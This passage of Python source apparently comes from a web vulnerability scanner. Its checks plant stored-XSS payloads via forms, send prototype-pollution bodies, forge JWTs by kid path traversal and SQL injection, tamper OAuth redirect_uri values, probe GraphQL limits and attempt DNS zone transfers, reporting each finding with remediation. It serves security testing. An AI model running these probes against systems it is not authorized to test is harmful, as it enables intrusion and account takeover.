                "/contact", "/reviews", "/review", "/testimonials",
                "/forum", "/posts", "/discuss", "/support"):
        if _pg in (surf.pages or []):
            continue
        try:
            _r = ctx.client.get(_pg)
        except Exception:
            continue
        if _r.status != 200 or "<form" not in (_r.body or "").lower():
            continue
        if ctx.is_missing(_r):
            continue
        _tmp = crawl_mod.Surface()
        try:
            crawl_mod._extract_bs4(_r.body, _pg, lambda v, i: None,
                                   _tmp, ctx.client.host)
        except Exception:
            continue
        for _f in _tmp.forms:
            if (_f.get("method") or "GET").upper() != "POST":
                continue
            _k = (_f.get("action"), _f.get("page"))
            if _k not in _known:
                forms.append(_f)
                _known.add(_k)
    plantable = []
    for form in forms:
        action = form.get("action") or form.get("page") or "/"
        low = action.lower()
        if any(k in low for k in ("login", "signin", "sign-in", "auth",
                                  "logout", "register", "signup", "password")):
            continue
        inputs = [i for i in (form.get("inputs") or [])
                  if isinstance(i, str) and i
                  and not any(k in i.lower() for k in
                              ("pass", "email", "token", "csrf", "file"))]
        if inputs:
            plantable.append((form, action, inputs))
    if not plantable:
        return
    # Retrieval pages + BASELINE capture BEFORE anything is planted.
    pages = []
    for form, action, _inputs in plantable:
        for pg in (form.get("page"), action):
            if pg and pg not in pages:
                pages.append(pg)
    for pg in list(surf.pages)[:8]:
        if pg not in pages:
            pages.append(pg)
    pages = pages[:10]

    def _fresh_bodies():
        out = {}
        for pg in pages:
            try:
                # header probe: memaksa fetch segar (melewati cache klien) —
                # snapshot lama tidak boleh menutupi bukti stored.
                r = ctx.client.get(pg, headers=_VERIFY_HDR)
            except Exception:
                continue
            if r.status == 200:
                out[pg] = r.body or ""
        return out

    baseline_bodies = _fresh_bodies()
    marks = ctx.xss_marks()
    planted = []
    for form, action, inputs in plantable:
        if len(planted) >= 5:
            break
        payload = f"<svg/onload={marks['inner']}{len(planted)}>"
        data = "&".join(f"{quote(n, safe='')}={quote(payload, safe='')}"
                        for n in inputs[:4])
        try:
            resp = ctx.client.post(action, data=data)
        except Exception:
            continue
        if resp.status == 0 or ctx.is_missing(resp):
            continue
        planted.append((form, action, payload, inputs[0]))
    if not planted:
        return
    bodies = _fresh_bodies()
    for form, action, payload, first_input in planted:
        credited = False
        for pg, body in bodies.items():
            after = xssverify.body_occurrences(body, payload)
            before = xssverify.body_occurrences(
                baseline_bodies.get(pg, ""), payload)
            if after <= before:
                continue
            res = xssverify.analyze(200, "text/html", body,
                                    baseline_bodies.get(pg, ""), marks)
            if res["verdict"] == "confirmed":
                add(F("HIGH", f"Stored XSS verified (persistent): {pg}",
                      'A payload planted through a form is stored by the application and rendered on a later, separate page view in an executable position in the parsed DOM ('
                      + ", ".join(res["kinds"]) + ') — any visitor of that page executes attacker script in the application origin. Credited only because the payload count rose above the pre-plant baseline (baseline diff) — a page that already contained the payload would prove nothing.',
                      evidence=f"payload planted via POST form at {action}; occurrences on GET {pg}: {before} (baseline) -> {after} (after plant); {res['detail']}",
                      cwe="CWE-79", owasp="A03:2021", cvss=6.5,
                      remed='Encode all user-supplied content on output (context-aware) and validate input; deploy a restrictive Content-Security-Policy as defense in depth.',
                      confidence="confirmed", location=pg, param=first_input))
                credited = True
                break
            if res["verdict"] == "reflected" and res["near_miss"]:
                add(F("MEDIUM", f"Stored XSS (position not confirmed): {pg}",
                      'The planted payload is stored and rendered above its pre-plant baseline, but the marker did not reach a proven executable position in the parsed DOM — reported as probable (position not confirmed), never as verified stored XSS.',
                      evidence=f"payload planted via POST form at {action}; occurrences on GET {pg}: {before} (baseline) -> {after} (after plant); {res['detail']}",
                      cwe="CWE-79", owasp="A03:2021", cvss=5.4,
                      remed='Encode all user-supplied content on output (context-aware) and validate input; deploy a restrictive Content-Security-Policy as defense in depth.',
                      confidence="probable", location=pg, param=first_input))
                credited = True
                break
        if not credited:
            ctx.L(f"  [stored] payload via {action}: no credited rendering "
                  "(not stored, encoded on output, or already present in "
                  "the pre-plant baseline)")


def c_prototype_pollution(ctx, add):
    """Prototype pollution: kirim {"__proto__": {key: marker}} ke endpoint
    JSON, lalu buktikan key marker itu MUNCUL pada respons permintaan NETRAL
    berikutnya (yang tidak memuat key itu sama sekali) — echo biasa dari
    request yang sama tidak pernah dihitung sebagai bukti."""
    cand = []
    for u in list(ctx.surface().js_endpoints) + list(ctx.surface().param_urls):
        ep = (u or "").split("?")[0]
        if "/api/" in ep and ep not in cand:
            cand.append(ep)
    hdr = {"Content-Type": "application/json"}
    for ep in cand[:6]:
        key = "vxpp" + ctx.marker
        hit = False
        for body in ({"__proto__": {key: "polluted"}},
                     {"constructor": {"prototype": {key: "polluted"}}}):
            try:
                ctx.client.post(ep, data=json.dumps(body), headers=hdr)
                v1 = ctx.client.post(ep, data="{}", headers=hdr)
                v2 = ctx.client.get(ep, headers=_VERIFY_HDR)
            except Exception:
                continue
            for resp in (v1, v2):
                if resp.status == 200 and key in (resp.body or "") \
                        and "polluted" in (resp.body or ""):
                    hit = True
                    break
            if hit:
                break
        if hit:
            add(F("HIGH", f"Prototype pollution confirmed: {ep}",
                  'A __proto__ payload sent to this JSON endpoint permanently alters the server-side object prototype: a later neutral request (which never contained the key) returns the planted property. Depending on what the application reads from polluted defaults, this can bypass authorization checks or crash the service.',
                  evidence=f"planted key '{key}' persists in neutral responses from {ep}",
                  cwe="CWE-1321", owasp="A08:2021", cvss=7.5,
                  remed='Reject or strip __proto__/constructor/prototype keys on JSON input; use Object.create(null) or Map for merge targets; freeze prototypes.',
                  confidence="confirmed", location=ep))


def c_jwt_kid_injection(ctx, add):
    """JWT kid injection: baseline endpoint identitas harus dulu terbukti
    menerima token asli. Baru dua serangan kid diuji — traversal ke
    /dev/null (kunci kosong) dan SQLi di kid (kunci = literal hasil query).
    Hanya pantulan identitas PALSU yang menjadi temuan confirmed."""
    for tok in _find_jwts(ctx):
        parts = tok.split(".")
        if len(parts) != 3:
            continue
        header, payload = _b64url_json(parts[0]), _b64url_json(parts[1])
        if not header or not isinstance(payload, dict):
            continue
        idkey = next((k for k in ("user", "sub", "id", "username", "email")
                      if k in payload), None)
        if not idkey:
            continue

        def probe(ep, token):
            return ctx.client.request(
                "GET", ep, headers={"Authorization": f"Bearer {token}"})

        for ep in ("/api/me", "/api/user", "/api/profile", "/api/auth/me",
                   "/api/v1/me", "/me"):
            try:
                r0 = probe(ep, tok)
            except Exception:
                continue
            if r0.status != 200 or str(payload[idkey]) not in (r0.body or ""):
                continue
            forged_val = "ptk-forged-admin"
            forged_payload = dict(payload, **{idkey: forged_val})

            def craft(kid, key):
                h = _b64url_encode(json.dumps(
                    {"alg": "HS256", "typ": "JWT", "kid": kid}).encode())
                pl = _b64url_encode(json.dumps(forged_payload).encode())
                mac = hmac_mod.new(key, f"{h}.{pl}".encode(), hashlib.sha256)
                return f"{h}.{pl}.{_b64url_encode(mac.digest())}"

            attacks = (
                ("path traversal to /dev/null (empty key)",
                 craft("../../dev/null", b"")),
                ("SQL injection in kid",
                 craft("' UNION SELECT 'vxkidkey' -- ", b"vxkidkey")),
            )
            for label, forged in attacks:
                try:
                    r1 = probe(ep, forged)
                except Exception:
                    continue
                if r1.status == 200 and forged_val in (r1.body or ""):
                    add(F("CRITICAL",
                          f"JWT kid injection ({label}): {ep}",
                          'The endpoint uses the JWT kid header without sanitization, letting an attacker choose the verification key (a file path or an SQL fragment) and forge arbitrary identities — full authentication bypass.',
                          evidence=f"forged identity '{forged_val}' accepted at {ep} via kid {label}",
                          cwe="CWE-347", owasp="A07:2021", cvss=9.8,
                          remed='Never let kid select keys from the filesystem or a database query; pin a server-side key allowlist and reject unexpected kid values.',
                          confidence="confirmed", location=ep))


_GQL_INTROSPECTION = (
    "{__schema{queryType{name} types{name kind "
    "fields{name args{name defaultValue type{kind name ofType{kind name "
    "ofType{kind name ofType{kind name}}}}} type{kind name ofType{kind "
    "name ofType{kind name ofType{kind name}}}}}}}}")

_GQL_SENSITIVE = re.compile(
    r"user|account|customer|member|employee|order|admin|profile|"
    r"invoice|payment|billing", re.I)
_GQL_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")


def _gql_named(tref):
    """Unwrap NON_NULL/LIST wrappers down to the named type."""
    t = tref or {}
    seen = 0
    while t.get("kind") in ("NON_NULL", "LIST") and t.get("ofType") \
            and seen < 8:
        t = t["ofType"]
        seen += 1
    return t.get("kind"), t.get("name")


def _gql_parse_schema(sch):
    types = {}
    for t in sch.get("types") or []:
        if not isinstance(t, dict) or not t.get("name"):
            continue
        fields = {}
        for f in t.get("fields") or []:
            if not isinstance(f, dict) or not f.get("name"):
                continue
            args = [{"name": a.get("name", ""),
                     "required": bool(
                         (a.get("type") or {}).get("kind") == "NON_NULL"
                         and a.get("defaultValue") is None)}
                    for a in f.get("args") or []]
            fields[f["name"]] = {"type": f.get("type") or {},
                                 "args": args}
        types[t["name"]] = {"kind": t.get("kind"), "fields": fields}
    qt = (sch.get("queryType") or {}).get("name", "")
    if qt not in types:
        return None
    return {"queryType": qt, "types": types}


def _gql_depth_chain(schema, max_depth):
    """Longest deterministic chain of object-typed fields starting at
    the Query type (first field wins; cycles extend the chain, which
    is exactly the nested-query amplification shape)."""
    types = schema["types"]
    qt = schema["queryType"]
    if qt not in types:
        return []

    def obj_field(tname):
        for fname, finfo in types.get(tname, {}).get("fields",
                                                     {}).items():
            if fname.startswith("__"):
                continue
            k, n = _gql_named(finfo["type"])
            if k == "OBJECT" and n in types:
                return fname, n
        return None, None

    chain, cur = [], qt
    while len(chain) < max_depth:
        f, n = obj_field(cur)
        if not f:
            break
        chain.append((cur, f, n))
        cur = n
    return chain


def _gql_nested_query(chain):
    q = "__typename"
    for _t, f, _n in reversed(chain):
        q = f"{f}{{{q}}}"
    return "{" + q + "}"


def _gql_resolve_path(data, chain):
    cur = data
    for _t, f, _n in chain:
        if isinstance(cur, list):
            cur = cur[0] if cur else None
        if not isinstance(cur, dict) or f not in cur:
            return False
        cur = cur[f]
    return cur is not None


def _gql_selection(schema, tname):
    flds = schema["types"].get(tname, {}).get("fields", {})
    scalars = [fn for fn, fi in flds.items()
               if _gql_named(fi["type"])[0] in ("SCALAR", "ENUM")][:5]
    return " ".join(scalars) if scalars else "__typename"


def _gql_field_data(client, ep, hdr, fname, selection):
    """-> (data_value, serialized_snippet) or (None, "") when the
    field did not return data for this identity."""
    q = "{" + fname + "{" + selection + "}}"
    try:
        r = client.post(ep, data=json.dumps({"query": q}), headers=hdr)
        parsed = json.loads(r.body or "")
    except Exception:
        return None, ""
    if not isinstance(parsed, dict):
        return None, ""
    data = parsed.get("data")
    if isinstance(data, dict) and data.get(fname) is not None:
        return data[fname], json.dumps(data[fname])[:2000]
    return None, ""


def _gql_field_authz(ctx, add, ep, hdr, schema):
    """WS2 (v1.8.0): field-level authorization. The same sensitive
    field is queried as the primary session, as a second credential
    set (opts auth_b — the BOLA infrastructure) and anonymously;
    verdicts rest on the DATA each identity actually receives.
    Without any credential set, the cross-account differential is
    recorded as not evaluated — the anonymous probe still stands on
    its own evidence."""
    from netclient import Client as _Client
    qt = schema["queryType"]
    qfields = schema["types"].get(qt, {}).get("fields", {})
    cands = []
    for fname, finfo in qfields.items():
        if fname.startswith("__") or not _GQL_SENSITIVE.search(fname):
            continue
        if any(a["required"] for a in finfo.get("args", [])):
            continue
        k, n = _gql_named(finfo["type"])
        if k != "OBJECT" or n not in schema["types"]:
            continue
        cands.append((fname, n))
    if not cands:
        ctx.L(f"  [graphql] {ep}: no sensitive no-arg object fields "
              "in the schema — field authorization not evaluated")
        return
    auth_b = ctx.opts.get("auth_b") or {}
    second = None
    if auth_b:
        second = _Client(ctx.target, timeout=ctx.client.timeout,
                         extra_headers=auth_b.get("headers") or {},
                         cookie=auth_b.get("cookie", ""))
        second.proxy = ctx.client.proxy
    anon = _Client(ctx.target, timeout=ctx.client.timeout)
    anon.proxy = ctx.client.proxy
    primary_auth = bool(ctx.opts.get("cookie") or ctx.opts.get("headers"))
    evaluated = []
    for fname, tname in cands[:3]:
        if ctx.cancelled():
            return
        sel = _gql_selection(schema, tname)
        d_prim, _s = _gql_field_data(ctx.client, ep, hdr, fname, sel)
        d_anon, s_anon = _gql_field_data(anon, ep, hdr, fname, sel)
        d_sec = None
        if second is not None:
            d_sec, _s2 = _gql_field_data(second, ep, hdr, fname, sel)
        evaluated.append(fname)
        if d_anon is not None:
            emails = _GQL_EMAIL_RE.findall(s_anon)
            if emails or (isinstance(d_anon, list) and len(d_anon) >= 2):
                add(F("HIGH", f"GraphQL field '{fname}' returns data without authentication: {ep}",
                      'An anonymous query for a sensitive field returned actual record data (PII-shaped content and/or multiple records) — field-level authorization is missing: this data does not require authentication to read.',
                      evidence=f"anonymous data: {s_anon[:160]}",
                      cwe="CWE-862", owasp="API3:2023 Broken Object Property Level Authorization",
                      cvss=7.5,
                      remed="Enforce per-field authorization in resolvers; require authentication for data-bearing fields.",
                      confidence="confirmed", location=ep))
            else:
                add(F("MEDIUM", f"GraphQL field '{fname}' accessible without authentication: {ep}",
                      'An anonymous query returned data for a sensitive-named field. No PII-shaped content was observed in the sampled response, so this stays probable — verify the field is intentionally public.',
                      evidence=f"anonymous data present: {s_anon[:160]}",
                      cwe="CWE-862", owasp="API3:2023", cvss=5.3,
                      remed="Require authentication for data-bearing fields, or document them as public.",
                      confidence="probable", location=ep))
        elif second is not None and d_sec is not None \
                and d_prim is not None and "admin" in fname.lower():
            add(F("MEDIUM", f"GraphQL admin field '{fname}' readable by a second account: {ep}",
                  'A second (low-privilege) credential set read an admin-named field that anonymous callers cannot reach — field-level role authorization appears to be missing.',
                  evidence="primary=data, second=data, anonymous=denied",
                  cwe="CWE-862", owasp="API5:2023 Broken Function Level Authorization",
                  cvss=6.5,
                  remed="Enforce role checks inside resolvers for administrative fields.",
                  confidence="probable", location=ep))
    if not auth_b and not primary_auth:
        ctx.L(f"  [graphql] {ep}: cross-account field authorization "
              "not evaluated (no credential set supplied); anonymous "
              "exposure was still tested")
        ctx.check_meta.setdefault("graphql", {})["field_authz"] = \
            "anonymous-only (no credential set supplied)"
    else:
        ctx.check_meta.setdefault("graphql", {})["field_authz"] = \
            f"evaluated for fields: {', '.join(evaluated)}"


def c_graphql_deep(ctx, add):
    """GraphQL pendalaman: (a) query batching (amplifikasi brute-force/DoS),
    (b) field suggestion leakage (skema bocor dari pesan error walau
    introspeksi mati). Keduanya berbasis respons nyata endpoint GraphQL
    yang baseline-nya terbukti menjawab {__typename}."""
    cand = []
    for u in list(ctx.surface().js_endpoints) + list(ctx.surface().param_urls):
        ep = (u or "").split("?")[0]
        if "graphql" in ep.lower() and ep not in cand:
            cand.append(ep)
    if "/graphql" not in cand:
        cand.append("/graphql")
    hdr = {"Content-Type": "application/json"}
    for ep in cand[:3]:
        try:
            base = ctx.client.post(ep, data=json.dumps({"query": "{__typename}"}),
                                   headers=hdr)
        except Exception:
            continue
        if base.status != 200 or '"data"' not in (base.body or ""):
            continue
        try:
            arr = ctx.client.post(
                ep, headers=hdr,
                data=json.dumps([{"query": "{__typename}"},
                                 {"query": "{__typename}"}]))
            parsed = json.loads(arr.body or "")
            if (isinstance(parsed, list) and len(parsed) == 2
                    and all(isinstance(x, dict) and "data" in x for x in parsed)):
                add(F("LOW", f"GraphQL query batching enabled: {ep}",
                      'The endpoint executes JSON-array query batches, letting an attacker pack many operations (login attempts, object enumeration) into a single HTTP request and bypass per-request rate limits.',
                      evidence="array of 2 queries answered with 2 data results in one response",
                      cwe="CWE-770", owasp="API4:2023", cvss=3.7,
                      remed='Disable array batching or cap batch size; enforce rate limits per operation, not per request.',
                      confidence="probable", location=ep))
        except Exception:
            pass
        try:
            sug = ctx.client.post(ep, data=json.dumps({"query": "{ vxbadfield }"}),
                                  headers=hdr)
            if "Did you mean" in (sug.body or ""):
                add(F("LOW", f"GraphQL field suggestion leakage: {ep}",
                      'Error responses include "Did you mean" field suggestions, disclosing valid schema field names even when introspection is disabled — an attacker can reconstruct the schema interactively.',
                      evidence=(sug.body or "")[:200],
                      cwe="CWE-209", owasp="API8:2023", cvss=3.7,
                      remed='Disable field suggestions in production (e.g. hideSchemaDetails / custom error formatting).',
                      confidence="probable", location=ep))
        except Exception:
            pass
        # ---- WS2 (v1.8.0): alias amplification — the verdict comes
        # from the response (aliases actually resolved), never from
        # the request merely being accepted.
        try:
            _aliases = [f"ptka{i}" for i in range(
                max(10, min(100, int(ctx.opts.get("graphql_aliases",
                                                  50)))))]
            _aq = "{" + " ".join(f"{a}:__typename" for a in _aliases) + "}"
            ar = ctx.client.post(ep, data=json.dumps({"query": _aq}),
                                 headers=hdr)
            ap = json.loads(ar.body or "")
            adata = ap.get("data") or {}
            resolved = sum(1 for a in _aliases
                           if adata.get(a) is not None)
            aerr = json.dumps(ap.get("errors") or "").lower()
            if resolved >= max(10, int(len(_aliases) * 0.9)):
                add(F("LOW", f"GraphQL alias amplification accepted: {ep}",
                      f'A single query carrying {len(_aliases)} aliases of the same field was fully resolved — no alias/complexity cap is enforced, so one HTTP request can multiply resolver work (and batch credential or object probes) far beyond per-request rate limits.',
                      evidence=f"{resolved}/{len(_aliases)} aliases resolved in one response",
                      cwe="CWE-770", owasp="API4:2023 Unrestricted Resource Consumption",
                      cvss=5.3,
                      remed='Enforce query complexity and alias limits (cost analysis) at the GraphQL layer.',
                      confidence="probable", location=ep))
            elif any(k in aerr for k in ("alias", "complexity",
                                         "too many", "limit")):
                ctx.L(f"  [graphql] {ep}: alias amplification is "
                      "limited by the server (healthy)")
        except Exception:
            pass
        # ---- WS2 (v1.8.0): schema-driven depth + field authorization.
        schema = None
        try:
            ir = ctx.client.post(
                ep, data=json.dumps({"query": _GQL_INTROSPECTION}),
                headers=hdr)
            iparsed = json.loads(ir.body or "")
            sch = (iparsed.get("data") or {}).get("__schema")
            if isinstance(sch, dict):
                schema = _gql_parse_schema(sch)
        except Exception:
            pass
        if not schema:
            ctx.L(f"  [graphql] {ep}: introspection unavailable — "
                  "query depth and field authorization not evaluated")
            continue
        try:
            maxd = max(4, min(12, int(ctx.opts.get("graphql_max_depth",
                                                   8))))
            chain = _gql_depth_chain(schema, maxd)
            if len(chain) >= 4:
                dq = _gql_nested_query(chain)
                dr = ctx.client.post(ep, data=json.dumps({"query": dq}),
                                     headers=hdr)
                dp = json.loads(dr.body or "")
                derr = json.dumps(dp.get("errors") or "").lower()
                if any(k in derr for k in ("depth", "complexity",
                                           "too deep", "maximum",
                                           "limit")):
                    ctx.L(f"  [graphql] {ep}: query depth/complexity "
                          f"limit enforced (chain length {len(chain)})")
                elif isinstance(dp.get("data"), dict) \
                        and _gql_resolve_path(dp["data"], chain):
                    add(F("LOW", f"GraphQL query depth not limited (resolved depth {len(chain)}): {ep}",
                          'A nested query following the schema\'s own object fields was fully resolved, with data at the deepest level — no query depth/complexity limit is enforced (nested-query denial-of-service surface).',
                          evidence="depth chain resolved with data: "
                                   + " > ".join(f for _t, f, _n in chain),
                          cwe="CWE-770", owasp="API4:2023", cvss=5.3,
                          remed='Enforce a maximum query depth and a complexity budget at the GraphQL layer.',
                          confidence="probable", location=ep))
        except Exception:
            pass
        _gql_field_authz(ctx, add, ep, hdr, schema)


def _oauth_cfg(ctx):
    for p in ("/.well-known/openid-configuration",
              "/.well-known/oauth-authorization-server"):
        r = ctx.client.get(p)
        if r.status == 200 and r.body and not ctx.is_missing(r):
            try:
                cfg = json.loads(r.body)
            except Exception:
                continue
            if isinstance(cfg, dict) and ("issuer" in cfg
                                          or "authorization_endpoint"
                                          in cfg):
                return p, cfg
    return None, None


def c_oauth_sso(ctx, add):
    """WS4 (v1.8.0): OAuth/OIDC misconfiguration. Two layers, per
    decision K2: (1) configuration analysis of the discovery document
    — always possible, verdicts stay at the config tier; (2) live
    authorize-flow observation, exercised ONLY as far as the flow
    actually advances anonymously (or with operator test credentials
    already carried by the scan session). A flow that stops at a
    login wall is reported as not evaluated, never forced."""
    cfg_path, cfg = _oauth_cfg(ctx)
    summary = {"config_found": bool(cfg), "config_path": cfg_path,
               "flows_tested": 0, "note": ""}
    if cfg:
        grants = [str(g) for g in
                  (cfg.get("grant_types_supported") or [])]
        rtypes = [str(t) for t in
                  (cfg.get("response_types_supported") or [])]
        methods = [str(m) for m in
                   (cfg.get("token_endpoint_auth_methods_supported")
                    or [])]
        if "password" in grants:
            add(F("MEDIUM", "OAuth password grant (ROPC) enabled",
                  'The discovery document advertises the Resource Owner Password Credentials grant — credentials flow through the client and phishing/credential-stuffing value rises sharply; the grant is removed from OAuth 2.1 for this reason.',
                  evidence=f"grant_types_supported={grants}",
                  cwe="CWE-798", owasp="A07:2021 Identification and Authentication Failures",
                  cvss=5.3,
                  remed='Disable the password grant; use authorization code + PKCE for all client types.',
                  confidence="probable", location=cfg_path))
        if "implicit" in grants or any("token" in t.split()
                                        for t in rtypes):
            add(F("MEDIUM", "OAuth implicit flow advertised",
                  'The discovery document advertises the implicit flow / token-bearing response types — tokens are delivered through the browser front channel (URLs, history, referrer leakage); OAuth 2.1 removes the implicit flow.',
                  evidence=f"grant_types_supported={grants}; response_types_supported={rtypes}",
                  cwe="CWE-359", owasp="A07:2021", cvss=5.3,
                  remed='Disable implicit response types; use authorization code + PKCE.',
                  confidence="probable", location=cfg_path))
        if "none" in methods:
            add(F("LOW", "OAuth token endpoint allows unauthenticated public clients ('none' auth method)",
                  'token_endpoint_auth_methods_supported includes "none": public clients can exchange codes without any client authentication — stolen codes are directly redeemable when combined with a redirect or PKCE gap.',
                  evidence=f"token_endpoint_auth_methods_supported={methods}",
                  cwe="CWE-798", owasp="A07:2021", cvss=3.7,
                  remed='Require client authentication at the token endpoint; keep "none" only for PKCE-bound public clients.',
                  confidence="candidate", location=cfg_path))
        if ctx.client.scheme == "https":
            http_eps = [k for k in ("authorization_endpoint",
                                    "token_endpoint", "jwks_uri")
                        if str(cfg.get(k, "")).startswith("http://")]
            if http_eps:
                add(F("MEDIUM", f"OAuth endpoints served over plain HTTP: {', '.join(http_eps)}",
                      'The site is served over HTTPS but the discovery document points authorization/token traffic at plain-HTTP endpoints — codes and tokens can be intercepted in transit.',
                      evidence=f"endpoints: {http_eps}",
                      cwe="CWE-319", owasp="A02:2021 Cryptographic Failures",
                      cvss=6.5,
                      remed='Serve every OAuth endpoint over HTTPS with HSTS.',
                      confidence="probable", location=cfg_path))
    # ---- authorize-flow observation (K2 honesty gate)
    surf = ctx.surface(full=True)
    auth_urls = []
    for u in list(surf.param_urls) + list(surf.pages):
        if u and "authorize" in u and ("response_type=" in u
                                       or "client_id=" in u) \
                and u not in auth_urls:
            auth_urls.append(u)
    exercised = False
    for u in auth_urls[:2]:
        if ctx.cancelled():
            break
        parsed = urlparse(u)
        params = dict(parse_qsl(parsed.query))
        ru = params.get("redirect_uri", "")
        if not ru:
            continue

        def _go(p, _path=parsed.path):
            q = "&".join(f"{k}={quote(v, safe='')}"
                         for k, v in p.items())
            return ctx.client.get(_path + "?" + q)

        base = _go(params)
        if not (base.status in (301, 302, 303, 307, 308)
                and base.hdr("location").startswith(ru)):
            continue          # flow does not advance anonymously
        exercised = True
        summary["flows_tested"] += 1
        if "state" not in params:
            add(F("LOW", f"OAuth authorize flow proceeds without a state parameter: {parsed.path}",
                  'The authorization flow advances to the redirect_uri without any state parameter — the callback cannot be bound to the initiating session (login CSRF on the OAuth flow).',
                  evidence="authorize redirect issued with no state in the request",
                  cwe="CWE-352", owasp="A01:2021 Broken Access Control",
                  cvss=4.3,
                  remed='Require a high-entropy state value and verify it on the callback.',
                  confidence="candidate", location=parsed.path))
        else:
            p2 = {k: v for k, v in params.items() if k != "state"}
            r2 = _go(p2)
            if r2.status in (301, 302, 303, 307, 308) \
                    and r2.hdr("location").startswith(ru):
                add(F("MEDIUM", f"OAuth state parameter not enforced: {parsed.path}",
                      'Removing the state parameter does not stop the authorization flow — the server does not verify state, so the callback is not bound to the initiating session (login CSRF).',
                      evidence="flow advanced to redirect_uri with state removed",
                      cwe="CWE-352", owasp="A01:2021", cvss=5.4,
                      remed='Generate state per flow, store it server-side, and reject callbacks without a matching state.',
                      confidence="probable", location=parsed.path))
        if "code" in (params.get("response_type", "")).split() \
                and "code_challenge" not in params:
            add(F("LOW", f"OAuth code flow observed without PKCE: {parsed.path}",
                  'The authorization code flow advances without a code_challenge — intercepted codes are redeemable by whoever holds them (no PKCE binding).',
                  evidence="authorize redirect issued with response_type=code and no code_challenge",
                  cwe="CWE-347", owasp="A07:2021", cvss=4.3,
                  remed='Require PKCE (S256) for all clients, including confidential ones.',
                  confidence="candidate", location=parsed.path))
        evil = "https://vanthex-probe.invalid/oauth-cb"
        p3 = dict(params)
        p3["redirect_uri"] = evil
        r3 = _go(p3)
        if r3.status in (301, 302, 303, 307, 308) \
                and r3.hdr("location").startswith(evil):
            add(F("HIGH", f"OAuth redirect_uri not validated: {parsed.path}",
                  'The authorization endpoint redirected the flow to an arbitrary, attacker-supplied redirect_uri — authorization codes (and implicit tokens) can be delivered to an attacker origin, the classic OAuth account-takeover primitive. The verdict is the observed redirect itself.',
                  evidence=f"tampered redirect_uri accepted; Location: {r3.hdr('location')[:120]}",
                  cwe="CWE-601", owasp="A01:2021 Broken Access Control",
                  cvss=8.1,
                  remed='Register exact redirect URIs and require byte-exact matching; never prefix/substring matching.',
                  confidence="confirmed", location=parsed.path))
    if auth_urls and not exercised:
        summary["note"] = ("authorize flow did not advance "
                           "anonymously — active flow checks not "
                           "evaluated (needs operator test "
                           "credentials, decision K2)")
        ctx.L(f"  [oauth] {summary['note']}")
    if not cfg and not auth_urls:
        summary["note"] = ("no OIDC configuration or authorize flow "
                           "discovered")
        ctx.L("  [oauth] no OIDC configuration or authorize flow "
              "discovered — not evaluated")
    ctx.check_meta["oauth"] = summary


# ------------------------------------------------- WS6a (v1.8.0): AXFR

def _dns_ns_records(domain):
    """NS hostnames for a zone via dnspython (approved library);
    [] when the lookup fails — the caller reports not evaluated."""
    try:
        import dns.resolver
    except Exception:
        return []
    res = dns.resolver.Resolver()
    res.timeout = 4
    res.lifetime = 6
    try:
        ans = res.resolve(domain, "NS")
        return sorted(str(r.target).rstrip(".") for r in ans)
    except Exception:
        return []


def _dns_a_records(name):
    try:
        import dns.resolver
    except Exception:
        return []
    res = dns.resolver.Resolver()
    res.timeout = 4
    res.lifetime = 6
    try:
        ans = res.resolve(name, "A")
        return sorted(str(r) for r in ans)
    except Exception:
        return []


def _axfr_attempt(server, zone, port=53, timeout=6.0):
    """One zone-transfer attempt over dnspython's wire query.
    Returns (status, info): "transferred" only when a complete AXFR
    answer arrived AND includes the zone SOA; record CONTENTS are
    never kept — counts and record types only."""
    try:
        import dns.query
        import dns.rcode
        import dns.rdatatype
    except Exception as e:
        return "error", {"error": f"dnspython unavailable: {e}"}
    total, types, soa = 0, {}, False
    try:
        for resp in dns.query.xfr(server, zone, timeout=timeout,
                                  lifetime=timeout + 4.0, port=port):
            for rrset in resp.answer:
                total += len(rrset)
                tname = dns.rdatatype.to_text(rrset.rdtype)
                types[tname] = types.get(tname, 0) + len(rrset)
                if rrset.rdtype == dns.rdatatype.SOA:
                    soa = True
    except Exception as e:
        if getattr(e, "rcode", None) is not None:
            try:
                if int(e.rcode) == int(dns.rcode.REFUSED):
                    return "refused", {"error": "server REFUSED the "
                                                "transfer"}
            except Exception:
                pass
        if "refused" in str(e).lower():
            return "refused", {"error": str(e)[:100]}
        return "error", {"error": str(e)[:100]}
    if total and soa:
        return "transferred", {"records": total, "types": types}
    return "error", {"error": "transfer ended without a complete "
                              "zone (no SOA)"}


def c_dns_axfr(ctx, add):
    """WS6a (v1.8.0): DNS zone transfer (AXFR). The verdict is the
    transfer itself: a full zone answer to an unauthenticated AXFR
    request. NS-discovery failure is reported as not evaluated —
    absence of a transfer is never claimed from a failed lookup."""
    import ipaddress
    host = ctx.client.host or ""
    try:
        ipaddress.ip_address(host)
        ctx.L("  [axfr] IP-literal target — zone transfer not "
              "evaluated (no zone to ask about)")
        return
    except ValueError:
        pass
    zone = org_domain(host)
    ns_names = _dns_ns_records(zone)
    if not ns_names:
        ctx.L(f"  [axfr] NS lookup for {zone} failed — zone transfer "
              "not evaluated")
        ctx.check_meta["axfr"] = {"zone": zone,
                                  "status": "not evaluated",
                                  "nameservers": []}
        return
    try:
        port = int(ctx.opts.get("axfr_port", 53))
    except Exception:
        port = 53
    rows = []
    for ns in ns_names[:3]:
        if ctx.cancelled():
            break
        ips = _dns_a_records(ns)
        if not ips:
            rows.append({"ns": ns, "server": "", "status": "unresolved"})
            continue
        status, info = _axfr_attempt(ips[0], zone, port=port)
        row = {"ns": ns, "server": ips[0], "status": status}
        row.update(info)
        rows.append(row)
        if status == "transferred":
            types_txt = ", ".join(f"{k}x{v}" for k, v
                                  in sorted(info["types"].items()))
            add(F("HIGH", f"DNS zone transfer (AXFR) open: {zone} via {ns}",
                  'The nameserver answered a full zone transfer to an unauthenticated requester — the entire DNS zone (every hostname, mail and service record) is disclosed, mapping the infrastructure for targeted attacks.',
                  evidence=f"{info['records']} records transferred ({types_txt}); record contents intentionally not stored",
                  cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
                  cvss=7.5,
                  remed='Restrict AXFR to secondary nameservers (TSIG + ACLs) on every authoritative server.',
                  confidence="confirmed", location=f"dns://{ns}"))
    ctx.check_meta["axfr"] = {"zone": zone, "status": "evaluated",
                              "nameservers": rows}
    ctx.L(f"  [axfr] {zone}: "
          + ", ".join(f"{r['ns']}={r['status']}" for r in rows))


# ------------------------------------------- WS6b (v1.8.0): buckets

_BUCKET_PATTERNS = ("{t}", "{t}-backup", "{t}-backups", "{t}-data",
                    "{t}-files", "{t}-assets", "{t}-media",
                    "{t}-uploads", "{t}-static", "{t}-public",
